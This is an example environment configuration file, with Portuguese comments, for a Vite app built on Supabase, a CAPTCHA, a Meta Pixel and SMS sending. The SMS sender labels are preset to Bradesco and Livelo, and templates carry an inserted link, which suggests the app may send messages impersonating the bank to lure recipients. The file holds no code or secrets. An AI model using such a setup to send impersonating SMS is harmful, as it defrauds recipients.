# ── Supabase ──────────────────────────────────────────────────────────────────
# Dashboard → Settings → API

VITE_SUPABASE_PROJECT_ID=      # Project Reference ID (ex: abcdefghijklmnopqrst)
VITE_SUPABASE_PUBLISHABLE_KEY= # Anon/public key (JWT)
VITE_SUPABASE_URL=             # ex: https://abcdefghijklmnopqrst.supabase.co

# ── Admin ──────────────────────────────────────────────────────────────────────
# Email do usuário criado em Authentication → Users no Supabase Dashboard

VITE_ADMIN_EMAIL=              # ex: admin@firma.com

# ── Cloudflare Turnstile ───────────────────────────────────────────────────────
# Deixe em branco para desabilitar o CAPTCHA

VITE_TURNSTILE_SITE_KEY=       # Site key pública — dash.cloudflare.com → Turnstile

# ── SMS ────────────────────────────────────────────────────────────────────────

VITE_SMS_SENDER_1_LABEL=Bradesco
VITE_SMS_SENDER_2_LABEL=Livelo
VITE_SMS_LINK=                 # Link inserido via {{link}} nos templates

# ── Meta Pixel ─────────────────────────────────────────────────────────────────

VITE_META_PIXEL_ID=            # ID do pixel — Meta Business Suite → Gerenciador de Eventos

# ==============================================================================
# Todas as chaves privadas (Turnstile secret, Risenew, IPInfo, ZenRows,
# Meta CAPI, Supabase service role) são configuradas como Supabase Secrets:
# Dashboard → Settings → Edge Functions → Secrets
# ou: npx supabase secrets set KEY=value --project-ref <id>
# ==============================================================================
